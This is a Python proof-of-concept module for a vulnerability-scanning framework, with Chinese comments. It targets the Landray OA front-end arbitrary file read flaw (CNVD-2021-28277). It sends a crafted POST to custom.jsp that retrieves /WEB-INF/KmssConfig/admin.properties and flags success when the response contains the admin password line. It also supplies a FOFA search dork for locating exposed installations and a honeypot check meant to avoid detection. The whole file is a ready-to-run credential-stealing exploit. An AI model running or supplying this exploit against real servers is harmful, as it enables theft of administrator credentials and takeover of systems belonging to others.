# coding:utf-8  
import requests
from lib.core.common import url_handle,get_random_ua
from lib.core.poc import POCBase
# ...
import urllib3
urllib3.disable_warnings()

class POC(POCBase):

    _info = {
        "author" : "hansi & jijue",                      # POC作者
        "version" : "2",                    # POC版本，默认是1  
        "CreateDate" : "2021-06-09",        # POC创建时间
        "UpdateDate" : "2021-06-09",        # POC创建时间
        "PocDesc" : """
        原POC逻辑过于简单，导致大量误报，经笔者优化，相对缓解  
        """,                                # POC描述，写更新描述，没有就不写

        "name" : "蓝凌OA前台任意文件读取漏洞",                        # 漏洞名称
        "VulnID" : "CNVD-2021-28277",                      # 漏洞编号，以CVE为主，若无CVE，使用CNVD，若无CNVD，留空即可
        "AppName" : "蓝凌OA",                     # 漏洞应用名称
        "AppVersion" : "",                  # 漏洞应用版本
        "VulnDate" : "2021-04-15",                    # 漏洞公开的时间,不知道就写今天，格式：xxxx-xx-xx
        "VulnDesc" : """
        近期CNVD爆出漏洞编号：CNVD-2021-28277，首次公开日期为2021-04-15，
        蓝凌oa存在多个漏洞，攻击者可利用该漏洞获取服务器控制权。
        链接：https://www.cnvd.org.cn/flaw/show/CNVD-2021-28277
        """,                                # 漏洞简要描述

        "fofa-dork":"""
        app="Landray-OA系统"
        """,                     # fofa搜索语句
        "example" : "",                     # 存在漏洞的演示url，写一个就可以了
        "exp_img" : "",                      # 先不管  
    }

    # timeout = 10


    def _verify(self):
        """
        返回vuln

        存在漏洞：vuln = [True,html_source] # html_source就是页面源码  

        不存在漏洞：vuln = [False,""]
        """
        vuln = [False,""]
        url = self.target + "/sys/ui/extend/varkind/custom.jsp" # url自己按需调整
        

        headers = {"User-Agent":get_random_ua(),
                    "Connection":"close",
                    "Content-Type": "application/x-www-form-urlencoded",
                    }
        data='var={"body":{"file":"/WEB-INF/KmssConfig/admin.properties"}}'
        try:
            """
            检测逻辑，漏洞存在则修改vuln值为True，漏洞不存在则不动
            """
            req = requests.post(url,headers = headers , data=data, proxies = self.proxy ,timeout = self.timeout,verify = False)
            if req.status_code == 200 and "password = " in req.text and "kmss.properties.encrypt.enabled = " in req.text:
                vuln = [True,req.text]
            else:
                vuln = [False,req.text]
        except Exception as e:
            raise e
        
        # 以下逻辑酌情使用
        if self._honeypot_check(vuln[1]) == True:
            vuln[0] = False
        
        return vuln

    def _attack(self):
        return self._verify()